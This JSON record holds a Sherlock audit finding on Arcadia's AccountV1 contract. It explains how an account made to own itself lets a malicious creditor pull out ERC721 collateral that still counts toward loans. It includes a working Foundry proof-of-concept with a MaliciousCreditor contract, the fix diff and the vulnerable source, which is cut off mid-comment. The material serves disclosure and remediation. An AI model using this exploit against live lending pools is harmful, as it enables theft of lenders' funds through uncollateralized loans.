{
  "Title": "H-1: `AccountV1#flashActionByCreditor` can be used to drain assets from account without withdrawing",
  "Content": "# Issue H-1: `AccountV1#flashActionByCreditor` can be used to drain assets from account without withdrawing \n\nSource: https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/140 \n\n## Found by \n0x52\n## Summary\n\n`AccountV1#flashActionByCreditor` is designed to allow atomic flash actions moving funds from the `owner` of the account. By making the account own itself, these arbitrary calls can be used to transfer `ERC721` assets directly out of the account. The assets being transferred from the account will still show as deposited on the account allowing it to take out loans from creditors without having any actual assets.\n\n## Vulnerability Detail\n\nThe overview of the exploit are as follows:\n\n    1) Deposit ERC721\n    2) Set creditor to malicious designed creditor\n    3) Transfer the account to itself\n    4) flashActionByCreditor to transfer ERC721\n        4a) account owns itself so _transferFromOwner allows transfers from account\n        4b) Account is now empty but still thinks is has ERC721\n    5) Use malicious designed liquidator contract to call auctionBoughtIn\n        and transfer account back to attacker\n    7) Update creditor to legitimate creditor\n    8) Take out loan against nothing\n    9) Profit\n\nThe key to this exploit is that the account is able to be it's own `owner`. Paired with a maliciously designed `creditor` (creditor can be set to anything) `flashActionByCreditor` can be called by the attacker when this is the case. \n\n[AccountV1.sol#L770-L772](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L770-L772)\n\n    if (transferFromOwnerData.assets.length > 0) {\n        _transferFromOwner(transferFromOwnerData, actionTarget);\n    }\n\nIn these lines the `ERC721` token is transferred out of the account. The issue is that even though the token is transferred out, the `erc721Stored` array is not updated to reflect this change.\n\n[AccountV1.sol#L570-L572](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L570-L572)\n\n    function auctionBoughtIn(address recipient) external onlyLiquidator nonReentrant {\n        _transferOwnership(recipient);\n    }\n\nAs seen above `auctionBoughtIn` does not have any requirement besides being called by the `liquidator`. Since the `liquidator` is also malicious. It can then abuse this function to set the `owner` to any address, which allows the attacker to recover ownership of the account. Now the attacker has an account that still considers the `ERC721` token as owned but that token isn't actually present in the account.\n\nNow the account creditor can be set to a legitimate pool and a loan taken out against no collateral at all.\n\n## Impact\n\nAccount can take out completely uncollateralized loans, causing massive losses to all lending pools.\n\n## Code Snippet\n\n[AccountV1.sol#L265-L270](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L265-L270)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe root cause of this issue is that the account can own itself. The fix is simple, make the account unable to own itself by causing transferOwnership to revert if `owner == address(this)`\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid: flashActionByCreditor should be mitigated; high(7)\n\n\n\n**j-vp**\n\nCreated a (very) quick & dirty POC to confirm the validity:\n\n```solidity\n/**\n * Created by Pragma Labs\n * SPDX-License-Identifier: MIT\n */\npragma solidity 0.8.22;\n\nimport { Fork_Test } from \"../Fork.t.sol\";\n\nimport { ERC20 } from \"../../../lib/solmate/src/tokens/ERC20.sol\";\nimport { ERC721 } from \"../../../lib/solmate/src/tokens/ERC721.sol\";\n\nimport { LiquidityAmounts } from \"../../../src/asset-modules/UniswapV3/libraries/LiquidityAmounts.sol\";\nimport { LiquidityAmountsExtension } from\n    \"../../utils/fixtures/uniswap-v3/extensions/libraries/LiquidityAmountsExtension.sol\";\nimport { INonfungiblePositionManagerExtension } from\n    \"../../utils/fixtures/uniswap-v3/extensions/interfaces/INonfungiblePositionManagerExtension.sol\";\nimport { ISwapRouter } from \"../../utils/fixtures/uniswap-v3/extensions/interfaces/ISwapRouter.sol\";\nimport { IUniswapV3Factory } from \"../../utils/fixtures/uniswap-v3/extensions/interfaces/IUniswapV3Factory.sol\";\nimport { IUniswapV3PoolExtension } from\n    \"../../utils/fixtures/uniswap-v3/extensions/interfaces/IUniswapV3PoolExtension.sol\";\nimport { TickMath } from \"../../../src/asset-modules/UniswapV3/libraries/TickMath.sol\";\nimport { UniswapV3AM } from \"../../../src/asset-modules/UniswapV3/UniswapV3AM.sol\";\nimport { ActionData } from \"../../../src/interfaces/IActionBase.sol\";\nimport { IPermit2 } from \"../../../src/interfaces/IPermit2.sol\";\nimport { AccountV1 } from \"../../../src/accounts/AccountV1.sol\";\n\n/**\n * @notice Fork tests for \"UniswapV3AM\" to test issue 140.\n */\ncontract UniswapV3AM_Fork_Test is Fork_Test {\n    /*///////////////////////////////////////////////////////////////\n                            CONSTANTS\n    ///////////////////////////////////////////////////////////////*/\n    INonfungiblePositionManagerExtension internal constant NONFUNGIBLE_POSITION_MANAGER =\n        INonfungiblePositionManagerExtension(0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1);\n    ISwapRouter internal constant SWAP_ROUTER = ISwapRouter(0x2626664c2603336E57B271c5C0b26F421741e481);\n    IUniswapV3Factory internal constant UNISWAP_V3_FACTORY =\n        IUniswapV3Factory(0x33128a8fC17869897dcE68Ed026d694621f6FDfD);\n\n    /*///////////////////////////////////////////////////////////////\n                            TEST CONTRACTS\n    ///////////////////////////////////////////////////////////////*/\n\n    UniswapV3AM internal uniV3AM_;\n    MaliciousCreditor internal maliciousCreditor;\n\n    /*///////////////////////////////////////////////////////////////\n                            SET-UP FUNCTION\n    ///////////////////////////////////////////////////////////////*/\n\n    function setUp() public override {\n        Fork_Test.setUp();\n\n        // Deploy uniV3AM_.\n        vm.startPrank(users.creatorAddress);\n        uniV3AM_ = new UniswapV3AM(address(registryExtension), address(NONFUNGIBLE_POSITION_MANAGER));\n        registryExtension.addAssetModule(address(uniV3AM_));\n        uniV3AM_.setProtocol();\n        vm.stopPrank();\n\n        vm.label({ account: address(uniV3AM_), newLabel: \"Uniswap V3 Asset Module\" });\n\n        maliciousCreditor = new MaliciousCreditor(users.creatorAddress);\n        vm.startPrank(users.creatorAddress);\n        registryExtension.setRiskParametersOfPrimaryAsset(\n            address(maliciousCreditor), address(DAI), 0, type(uint112).max, 9000, 9500\n        );\n        registryExtension.setRiskParametersOfPrimaryAsset(\n            address(maliciousCreditor), address(USDC), 0, type(uint112).max, 9000, 9500\n        );\n        registryExtension.setRiskParametersOfPrimaryAsset(\n            address(maliciousCreditor), address(WETH), 0, type(uint112).max, 9000, 9500\n        );\n        registryExtension.setRiskParametersOfDerivedAM(\n            address(maliciousCreditor), address(uniV3AM_), type(uint112).max, 10_000\n        );\n        registryExtension.setRiskParameters(address(maliciousCreditor), 0, 0, 10);\n        vm.stopPrank();\n    }\n\n    /*////////////////////////////////////////////////////////////////\n                        HELPER FUNCTIONS\n    ////////////////////////////////////////////////////////////////*/\n    function isWithinAllowedRange(int24 tick) public pure returns (bool) {\n        int24 MIN_TICK = -887_272;\n        int24 MAX_TICK = -MIN_TICK;\n        return (tick < 0 ? uint256(-int256(tick)) : uint256(int256(tick))) <= uint256(uint24(MAX_TICK));\n    }\n\n    function addLiquidity(\n        IUniswapV3PoolExtension pool,\n        uint128 liquidity,\n        address liquidityProvider_,\n        int24 tickLower,\n        int24 tickUpper,\n        bool revertsOnZeroLiquidity\n    ) public returns (uint256 tokenId) {\n        (uint160 sqrtPrice,,,,,,) = pool.slot0();\n\n        (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity(\n            sqrtPrice, TickMath.getSqrtRatioAtTick(tickLower), TickMath.getSqrtRatioAtTick(tickUpper), liquidity\n        );\n\n        tokenId = addLiquidity(pool, amount0, amount1, liquidityProvider_, tickLower, tickUpper, revertsOnZeroLiquidity);\n    }\n\n    function addLiquidity(\n        IUniswapV3PoolExtension pool,\n        uint256 amount0,\n        uint256 amount1,\n        address liquidityProvider_,\n        int24 tickLower,\n        int24 tickUpper,\n        bool revertsOnZeroLiquidity\n    ) public returns (uint256 tokenId) {\n        // Check if test should revert or be skipped when liquidity is zero.\n        // This is hard to check with assumes of the fuzzed inputs due to rounding errors.\n        if (!revertsOnZeroLiquidity) {\n            (uint160 sqrtPrice,,,,,,) = pool.slot0();\n            uint256 liquidity = LiquidityAmountsExtension.getLiquidityForAmounts(\n                sqrtPrice,\n                TickMath.getSqrtRatioAtTick(tickLower),\n                TickMath.getSqrtRatioAtTick(tickUpper),\n                amount0,\n                amount1\n            );\n            vm.assume(liquidity > 0);\n        }\n\n        address token0 = pool.token0();\n        address token1 = pool.token1();\n        uint24 fee = pool.fee();\n\n        deal(token0, liquidityProvider_, amount0);\n        deal(token1, liquidityProvider_, amount1);\n        vm.startPrank(liquidityProvider_);\n        ERC20(token0).approve(address(NONFUNGIBLE_POSITION_MANAGER), type(uint256).max);\n        ERC20(token1).approve(address(NONFUNGIBLE_POSITION_MANAGER), type(uint256).max);\n        (tokenId,,,) = NONFUNGIBLE_POSITION_MANAGER.mint(\n            INonfungiblePositionManagerExtension.MintParams({\n                token0: token0,\n                token1: token1,\n                fee: fee,\n                tickLower: tickLower,\n                tickUpper: tickUpper,\n                amount0Desired: amount0,\n                amount1Desired: amount1,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: liquidityProvider_,\n                deadline: type(uint256).max\n            })\n        );\n        vm.stopPrank();\n    }\n\n    function assertInRange(uint256 actualValue, uint256 expectedValue, uint8 precision) internal {\n        if (expectedValue == 0) {\n            assertEq(actualValue, expectedValue);\n        } else {\n            vm.assume(expectedValue > 10 ** (2 * precision));\n            assertGe(actualValue * (10 ** precision + 1) / 10 ** precision, expectedValue);\n            assertLe(actualValue * (10 ** precision - 1) / 10 ** precision, expectedValue);\n        }\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                            FORK TESTS\n    ///////////////////////////////////////////////////////////////*/\n\n    function testFork_Success_deposit2(uint128 liquidity, int24 tickLower, int24 tickUpper) public {\n        vm.assume(liquidity > 10_000);\n\n        IUniswapV3PoolExtension pool =\n            IUniswapV3PoolExtension(UNISWAP_V3_FACTORY.getPool(address(DAI), address(WETH), 100));\n        (, int24 tickCurrent,,,,,) = pool.slot0();\n\n        // Check that ticks are within allowed ranges.\n        tickLower = int24(bound(tickLower, tickCurrent - 16_095, tickCurrent + 16_095));\n        tickUpper = int24(bound(tickUpper, tickCurrent - 16_095, tickCurrent + 16_095));\n        // Ensure Tick is correctly spaced.\n        {\n            int24 tickSpacing = UNISWAP_V3_FACTORY.feeAmountTickSpacing(pool.fee());\n            tickLower = tickLower / tickSpacing * tickSpacing;\n            tickUpper = tickUpper / tickSpacing * tickSpacing;\n        }\n        vm.assume(tickLower < tickUpper);\n        vm.assume(isWithinAllowedRange(tickLower));\n        vm.assume(isWithinAllowedRange(tickUpper));\n\n        // Check that Liquidity is within allowed ranges.\n        vm.assume(liquidity <= pool.maxLiquidityPerTick());\n\n        // Balance pool before mint\n        uint256 amountDaiBefore = DAI.balanceOf(address(pool));\n        uint256 amountWethBefore = WETH.balanceOf(address(pool));\n\n        // Mint liquidity position.\n        uint256 tokenId = addLiquidity(pool, liquidity, users.accountOwner, tickLower, tickUpper, false);\n\n        // Balance pool after mint\n        uint256 amountDaiAfter = DAI.balanceOf(address(pool));\n        uint256 amountWethAfter = WETH.balanceOf(address(pool));\n\n        // Amounts deposited in the pool.\n        uint256 amountDai = amountDaiAfter - amountDaiBefore;\n        uint256 amountWeth = amountWethAfter - amountWethBefore;\n\n        // Precision oracles up to % -> need to deposit at least 1000 tokens or rounding errors lead to bigger errors.\n        vm.assume(amountDai + amountWeth > 100);\n\n        // Deposit the Liquidity Position.\n        {\n            address[] memory assetAddress = new address[](1);\n            assetAddress[0] = address(NONFUNGIBLE_POSITION_MANAGER);\n\n            uint256[] memory assetId = new uint256[](1);\n            assetId[0] = tokenId;\n\n            uint256[] memory assetAmount = new uint256[](1);\n            assetAmount[0] = 1;\n            vm.startPrank(users.accountOwner);\n            ERC721(address(NONFUNGIBLE_POSITION_MANAGER)).approve(address(proxyAccount), tokenId);\n            proxyAccount.deposit(assetAddress, assetId, assetAmount);\n            vm.stopPrank();\n        }\n\n        vm.startPrank(users.accountOwner);\n        // exploit starts: user adds malicious creditor to keep the \"hook\" after the account transfer\n        proxyAccount.openMarginAccount(address(maliciousCreditor));\n\n        // avoid any cooldowns\n        uint256 time = block.timestamp;\n        vm.warp(time + 1 days);\n\n        // transfer the account to itself\n        factory.safeTransferFrom(users.accountOwner, address(proxyAccount), address(proxyAccount));\n        vm.stopPrank();\n        assertEq(proxyAccount.owner(), address(proxyAccount));\n\n        vm.startPrank(users.creatorAddress);\n\n        // from the malicous creditor set earlier, start a flashActionByCreditor which withdraws the univ3lp as a \"transferFromOwner\"\n        maliciousCreditor.doFlashActionByCreditor(address(proxyAccount), tokenId, address(NONFUNGIBLE_POSITION_MANAGER));\n        vm.stopPrank();\n\n        // univ3lp changed ownership to the malicious creditor\n        assertEq(ERC721(address(NONFUNGIBLE_POSITION_MANAGER)).ownerOf(tokenId), address(maliciousCreditor));\n        assertEq(ERC721(address(NONFUNGIBLE_POSITION_MANAGER)).balanceOf(address(proxyAccount)), 0);\n\n        // account still shows it has a collateral value\n        assertGt(proxyAccount.getCollateralValue(), 0);\n\n        // univ3lp is still accounted for in the account\n        (address[] memory assets, uint256[] memory ids, uint256[] memory amounts) = proxyAccount.generateAssetData();\n        assertEq(assets[0], address(NONFUNGIBLE_POSITION_MANAGER));\n        assertEq(ids[0], tokenId);\n        assertEq(amounts[0], 1);\n    }\n}\n\ncontract MaliciousCreditor {\n    address public riskManager;\n\n    constructor(address riskManager_) {\n        // Set the risk manager.\n        riskManager = riskManager_;\n    }\n\n    function openMarginAccount(uint256 version)\n        public\n        returns (bool success, address numeraire_, address liquidator_, uint256 minimumMargin_)\n    {\n        return (true, 0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb, address(0), 0); //dai\n    }\n\n    function doFlashActionByCreditor(address targetAccount, uint256 tokenId, address nftMgr) public {\n        ActionData memory withdrawData;\n        IPermit2.PermitBatchTransferFrom memory permit;\n        bytes memory signature;\n        bytes memory actionTargetData;\n\n        ActionData memory transferFromOwnerData;\n        transferFromOwnerData.assets = new address[](1);\n        transferFromOwnerData.assets[0] = nftMgr;\n        transferFromOwnerData.assetIds = new uint256[](1);\n        transferFromOwnerData.assetIds[0] = tokenId;\n        transferFromOwnerData.assetAmounts = new uint256[](1);\n        transferFromOwnerData.assetAmounts[0] = 1;\n        transferFromOwnerData.assetTypes = new uint256[](1);\n        transferFromOwnerData.assetTypes[0] = 1;\n\n        bytes memory actionData = abi.encode(withdrawData, transferFromOwnerData, permit, signature, actionTargetData);\n\n        AccountV1(targetAccount).flashActionByCreditor(address(this), actionData);\n    }\n\n    function executeAction(bytes memory actionData) public returns (ActionData memory) {\n        ActionData memory withdrawData;\n        return withdrawData;\n    }\n\n    function getOpenPosition(address) public pure returns (uint256) {\n        return 0;\n    }\n\n    function onERC721Received(address, address, uint256, bytes calldata) public pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n```\n\n**j-vp**\n\nI don't see a reasonable usecase where an account should own itself. wdyt @Thomas-Smets ?\n\n```solidity\nfunction transferOwnership(address newOwner) external onlyFactory notDuringAuction {\n    if (block.timestamp <= lastActionTimestamp + COOL_DOWN_PERIOD) revert AccountErrors.CoolDownPeriodNotPassed();\n\n    // The Factory will check that the new owner is not address(0).\n+   if (newOwner == address(this)) revert NoTransferToSelf();\n    owner = newOwner;\n}\n\nfunction _transferOwnership(address newOwner) internal {\n    // The Factory will check that the new owner is not address(0).\n+   if (newOwner == address(this)) revert NoTransferToSelf();\n    owner = newOwner;\n    IFactory(FACTORY).safeTransferAccount(newOwner);\n}\n```\n\n**Thomas-Smets**\n\nNo indeed, that should fix it\n\n**Thomas-Smets**\n\nFixes:\n- accounts: https://github.com/arcadia-finance/accounts-v2/pull/171\n- lending: https://github.com/arcadia-finance/lending-v2/pull/132\n\n**sherlock-admin**\n\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/accounts-v2/pull/171.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/137",
  "Code": [
    {
      "filename": "accounts-v2/src/accounts/AccountV1.sol",
      "content": "/**\n * Created by Pragma Labs\n * SPDX-License-Identifier: BUSL-1.1\n */\npragma solidity 0.8.22;\n\nimport { AccountErrors } from \"../libraries/Errors.sol\";\nimport { AccountStorageV1 } from \"./AccountStorageV1.sol\";\nimport { ERC20, SafeTransferLib } from \"../../lib/solmate/src/utils/SafeTransferLib.sol\";\nimport { AssetValuationLib, AssetValueAndRiskFactors } from \"../libraries/AssetValuationLib.sol\";\nimport { IERC721 } from \"../interfaces/IERC721.sol\";\nimport { IERC1155 } from \"../interfaces/IERC1155.sol\";\nimport { IRegistry } from \"../interfaces/IRegistry.sol\";\nimport { ICreditor } from \"../interfaces/ICreditor.sol\";\nimport { IActionBase, ActionData } from \"../interfaces/IActionBase.sol\";\nimport { IAccount } from \"../interfaces/IAccount.sol\";\nimport { IFactory } from \"../interfaces/IFactory.sol\";\nimport { IPermit2 } from \"../interfaces/IPermit2.sol\";\n\n/**\n * @title Arcadia Accounts\n * @author Pragma Labs\n * @notice Arcadia Accounts are smart contracts that act as onchain, decentralized and composable margin accounts.\n * They provide individuals, DAOs, and other protocols with a simple and flexible way to deposit and manage multiple assets as collateral.\n * The total combination of assets can be used as margin to back liabilities issued by any financial protocol (lending, leverage, futures...).\n * @dev Users can use this Account to deposit assets (fungible, non-fungible, LP positions, yiel bearing assets...).\n * The Account will denominate all the deposited assets into one Numeraire (one unit of account, like USD or ETH).\n * Users can use the single denominated value of all their assets to take margin (take credit line, financing for leverage...).\n * An increase of value of one asset will offset a decrease in value of another asset.\n * Ensure your total value denomination remains above the liquidation threshold, or risk being liquidated!\n * @dev Integrating this Account as means of margin/collateral management for your own protocol that requires collateral is encouraged.\n * Arcadia's Account functions will guarantee you a certain value of the Account.\n * For allowlists or liquidation strategies specific to your protocol, contact pragmalabs.dev\n */\ncontract AccountV1 is AccountStorageV1, IAccount {\n    using AssetValuationLib for AssetValueAndRiskFactors[];\n    using SafeTransferLib for ERC20;\n\n    /* //////////////////////////////////////////////////////////////\n                                CONSTANTS\n    ////////////////////////////////////////////////////////////// */\n\n    // The current Account Version.\n    uint256 public constant ACCOUNT_VERSION = 1;\n    // The maximum amount of different assets that can be used as collateral within an Arcadia Account.\n    uint256 public constant ASSET_LIMIT = 15;\n    // The cool-down period after an account action, that might be disadvantageous for a new Owner,\n    // during which ownership cannot be transferred to prevent the old Owner from frontrunning a transferFrom().\n    uint256 internal constant COOL_DOWN_PERIOD = 5 minutes;\n    // Storage slot with the address of the current implementation.\n    // This is the hardcoded keccak-256 hash of: \"eip1967.proxy.implementation\" subtracted by 1.\n    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    // The contract address of the Arcadia Accounts Factory.\n    address public immutable FACTORY;\n    // Uniswap Permit2 contract\n    IPermit2 internal immutable PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);\n\n    // Storage slot for the Account implementation, a struct to avoid storage conflict when dealing with upgradeable contracts.\n    struct AddressSlot {\n        address value;\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                                EVENTS\n    ////////////////////////////////////////////////////////////// */\n\n    event AssetManagerSet(address indexed owner, address indexed assetManager, bool value);\n    event MarginAccountChanged(address indexed creditor, address indexed liquidator);\n    event NumeraireSet(address indexed numeraire);\n\n    /* //////////////////////////////////////////////////////////////\n                                MODIFIERS\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @dev Throws if function is reentered.\n     */\n    modifier nonReentrant() {\n        if (locked != 1) revert AccountErrors.NoReentry();\n        locked = 2;\n        _;\n        locked = 1;\n    }\n\n    /**\n     * @dev Throws if called when the Account is in an auction.\n     */\n    modifier notDuringAuction() {\n        if (inAuction == true) revert AccountErrors.AccountInAuction();\n        _;\n    }\n\n    /**\n     * @dev Throws if called by any address other than an Asset Manager or the owner.\n     */\n    modifier onlyAssetManager() {\n        // A custom error would need to read out owner + isAssetManager storage\n        require(msg.sender == owner || isAssetManager[owner][msg.sender], \"A: Only Asset Manager\");\n        _;\n    }\n\n    /**\n     * @dev Throws if called by any address other than the Creditor.\n     */\n    modifier onlyCreditor() {\n        if (msg.sender != creditor) revert AccountErrors.OnlyCreditor();\n        _;\n    }\n\n    /**\n     * @dev Throws if called by any address other than the Factory address.\n     */\n    modifier onlyFactory() {\n        if (msg.sender != FACTORY) revert AccountErrors.OnlyFactory();\n        _;\n    }\n\n    /**\n     * @dev Throws if called by any address other than the Liquidator address.\n     */\n    modifier onlyLiquidator() {\n        if (msg.sender != liquidator) revert AccountErrors.OnlyLiquidator();\n        _;\n    }\n\n    /**\n     * @dev Throws if called by any address other than the owner.\n     */\n    modifier onlyOwner() {\n        if (msg.sender != owner) revert AccountErrors.OnlyOwner();\n        _;\n    }\n\n    /**\n     * @dev Starts the cool-down period during which ownership cannot be transferred.\n     * This prevents the old Owner from frontrunning a transferFrom().\n     */\n    modifier updateActionTimestamp() {\n        lastActionTimestamp = uint32(block.timestamp);\n        _;\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                                CONSTRUCTOR\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @param factory The contract address of the Arcadia Accounts Factory.\n     */\n    constructor(address factory) {\n        // This will only be the owner of the Account implementation.\n        // and will not affect any subsequent proxy implementation using this Account implementation.\n        owner = msg.sender;\n\n        FACTORY = factory;\n    }\n\n    /* ///////////////////////////////////////////////////////////////\n                          ACCOUNT MANAGEMENT\n    /////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Initiates the variables of the Account.\n     * @param owner_ The sender of the 'createAccount' on the Factory\n     * @param registry_ The 'beacon' contract with the external logic to price assets.\n     * @param creditor_ The contract address of the Creditor.\n     * @dev A proxy will be used to interact with the Account implementation.\n     * Therefore everything is initialised through an init function.\n     * This function will only be called (once) in the same transaction as the proxy Account creation through the Factory.\n     * @dev The Creditor will only be set if it's a non-zero address, in this case the numeraire_ passed as input will be ignored.\n     * @dev initialize has implicitly a nonReentrant guard, since the \"locked\" variable has value zero until the end of the function.\n     */\n    function initialize(address owner_, address registry_, address creditor_) external {\n        if (registry != address(0)) revert AccountErrors.AlreadyInitialized();\n        if (registry_ == address(0)) revert AccountErrors.InvalidRegistry();\n        owner = owner_;\n        registry = registry_;\n\n        if (creditor_ != address(0)) _openMarginAccount(creditor_);\n\n        locked = 1;\n    }\n\n    /**\n     * @notice Upgrades the Account version and stores a new address in the EIP1967 implementation slot.\n     * @param newImplementation The new contract address of the Account implementation.\n     * @param newRegistry The Registry for this specific implementation (might be identical to the old registry).\n     * @param data Arbitrary data, can contain instructions to execute when updating Account to new implementation.\n     * @param newVersion The new version of the Account implementation.\n     * @dev This function MUST be added to new Account implementations.\n     */\n    function upgradeAccount(address newImplementation, address newRegistry, uint256 newVersion, bytes calldata data)\n        external\n        onlyFactory\n        nonReentrant\n        notDuringAuction\n        updateActionTimestamp\n    {\n        // Cache old parameters.\n        address oldImplementation = _getAddressSlot(IMPLEMENTATION_SLOT).value;\n        address oldRegistry = registry;\n        uint256 oldVersion = ACCOUNT_VERSION;\n\n        // Store new parameters.\n        _getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;\n        registry = newRegistry;\n\n        // Prevent that Account is upgraded to a new version where the Numeraire can't be priced.\n        if (newRegistry != oldRegistry && !IRegistry(newRegistry).inRegistry(numeraire)) {\n            revert AccountErrors.InvalidRegistry();\n        }\n\n        // If a Creditor is set, new version should be compatible.\n        if (creditor != address(0)) {\n            (bool success,,,) = ICreditor(creditor).openMarginAccount(newVersion);\n            if (!success) revert AccountErrors.InvalidAccountVersion();\n        }\n\n        // Hook on the new logic to finalize upgrade.\n        // Used to eg. Remove exposure from old Registry and add exposure to the new Registry.\n        // Extra data can be added by the Factory for complex instructions.\n        this.upgradeHook(oldImplementation, oldRegistry, oldVersion, data);\n\n        // Event emitted by Factory.\n    }\n\n    /**\n     * @notice Returns the \"AddressSlot\" with member \"value\" located at \"slot\".\n     * @param slot The slot where the address of the Logic contract is stored.\n     * @return r The address stored in slot.\n     */\n    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n\n    /**\n     * @notice Finalizes the Upgrade to a new Account version on the new implementation Contract.\n     * @param oldImplementation The old contract address of the Account implementation.\n     * @param oldRegistry The Registry of the old version (might be identical to the new registry)\n     * @param oldVersion The old version of the Account implementation.\n     * @param data Arbitrary data, can contain instructions to execute in this function.\n     * @dev If upgradeHook() is implemented, it MUST verify that msg.sender == address(this).\n     */\n    function upgradeHook(address oldImplementation, address oldRegistry, uint256 oldVersion, bytes calldata data)\n        external\n    { }\n\n    /* ///////////////////////////////////////////////////////////////\n                        OWNERSHIP MANAGEMENT\n    /////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Transfers ownership of the contract to a new Account.\n     * @param newOwner The new owner of the Account.\n     * @dev Can only be called by the current owner via the Factory.\n     * A transfer of ownership of the Account is triggered by a transfer\n     * of ownership of the accompanying ERC721 Account NFT, issued by the Factory.\n     * Owner of Account NFT = owner of Account\n     * @dev Function uses a cool-down period during which ownership cannot be transferred.\n     * Cool-down period is triggered after any account action, that might be disadvantageous for a new Owner.\n     * This prevents the old Owner from frontrunning a transferFrom().\n     */\n    function transferOwnership(address newOwner) external onlyFactory notDuringAuction {\n        if (block.timestamp <= lastActionTimestamp + COOL_DOWN_PERIOD) revert AccountErrors.CoolDownPeriodNotPassed();\n\n        // The Factory will check that the new owner is not address(0).\n        owner = newOwner;\n    }\n\n    function _transferOwnership(address newOwner) internal {\n        // The Factory will check that the new owner is not address(0).\n        owner = newOwner;\n        IFactory(FACTORY).safeTransferAccount(newOwner);\n    }\n\n    /* ///////////////////////////////////////////////////////////////\n                        NUMERAIRE LOGIC\n    /////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Sets the Numeraire of the Account.\n     * @param numeraire_ The new Numeraire for the Account.\n     */\n    function setNumeraire(address numeraire_) external onlyOwner nonReentrant {\n        if (creditor != address(0)) revert AccountErrors.CreditorAlreadySet();\n        _setNumeraire(numeraire_);\n    }\n\n    /**\n     * @notice Sets the Numeraire of the Account.\n     * @param numeraire_ The new Numeraire for the Account.\n     */\n    function _setNumeraire(address numeraire_) internal {\n        if (!IRegistry(registry).inRegistry(numeraire_)) revert AccountErrors.NumeraireNotFound();\n\n        emit NumeraireSet(numeraire = numeraire_);\n    }\n\n    /* ///////////////////////////////////////////////////////////////\n                    MARGIN ACCOUNT SETTINGS\n    /////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Opens a margin account on the Account for a new Creditor.\n     * @param newCreditor The contract address of the Creditor.\n     * @dev Currently only one Creditor can be set\n     * (we are working towards a single account for multiple Creditors tho!).\n     * @dev Only open margin accounts for Creditors you trust!\n     * The Creditor has significant authorization: use margin, trigger liquidation, and manage assets.\n     */\n    function openMarginAccount(address newCreditor)\n        external\n        onlyOwner\n        nonReentrant\n        notDuringAuction\n        updateActionTimestamp\n    {\n        (address[] memory assetAddresses, uint256[] memory assetIds, uint256[] memory assetAmounts) =\n            generateAssetData();\n\n        // Cache old Creditor.\n        address oldCreditor = creditor;\n        if (oldCreditor == newCreditor) revert AccountErrors.CreditorAlreadySet();\n\n        // Remove the exposures of the Account for the old Creditor.\n        if (oldCreditor != address(0)) {\n            IRegistry(registry).batchProcessWithdrawal(oldCreditor, assetAddresses, assetIds, assetAmounts);\n        }\n\n        // Check if all assets in the Account are allowed by the new Creditor\n        // and add the exposure of the account for the new Creditor.\n        IRegistry(registry).batchProcessDeposit(newCreditor, assetAddresses, assetIds, assetAmounts);\n\n        // Open margin account for the new Creditor.\n        _openMarginAccount(newCreditor);\n\n        // A margin account can only be opened for one Creditor at a time.\n        // If set, close the margin account for the old Creditor.\n        if (oldCreditor != address(0)) {\n            // closeMarginAccount() checks if there is still an open position (open liabilities) of the Account for the old Creditor.\n            // If so, the function reverts.\n            ICreditor(oldCreditor).closeMarginAccount(address(this));\n        }\n    }\n\n    /**\n     * @notice Internal function: Opens a margin account for a new Creditor.\n     * @param creditor_ The contract address of the Creditor.\n     */\n    function _openMarginAccount(address creditor_) internal {\n        (bool success, address numeraire_, address liquidator_, uint256 minimumMargin_) =\n            ICreditor(creditor_).openMarginAccount(ACCOUNT_VERSION);\n        if (!success) revert AccountErrors.InvalidAccountVersion();\n\n        minimumMargin = uint96(minimumMargin_);\n        if (numeraire != numeraire_) _setNumeraire(numeraire_);\n\n        emit MarginAccountChanged(creditor = creditor_, liquidator = liquidator_);\n    }\n\n    /**\n     * @notice Closes the margin account of the Creditor.\n     * @dev Currently only one Creditor can be set.\n     */\n    function closeMarginAccount() external onlyOwner nonReentrant notDuringAuction {\n        // Cache creditor.\n        address creditor_ = creditor;\n        if (creditor_ == address(0)) revert AccountErrors.CreditorNotSet();\n\n        creditor = address(0);\n        liquidator = address(0);\n        minimumMargin = 0;\n\n        // Remove the exposures of the Account for the old Creditor.\n        (address[] memory assetAddresses, uint256[] memory assetIds, uint256[] memory assetAmounts) =\n            generateAssetData();\n        IRegistry(registry).batchProcessWithdrawal(creditor_, assetAddresses, assetIds, assetAmounts);\n\n        // closeMarginAccount() checks if there is still an open position (open liabilities) for the Account.\n        // If so, the function reverts.\n        ICreditor(creditor_).closeMarginAccount(address(this));\n\n        emit MarginAccountChanged(address(0), address(0));\n    }\n\n    /**\n     * @notice Sets an approved Creditor.\n     * @param creditor_ The contract address of the approved Creditor.\n     * @dev An approved Creditor is a Creditor for which no margin Account is immediately opened.\n     * But the approved Creditor itself can open the margin Account later in time to e.g. refinance liabilities.\n     * @dev Potential 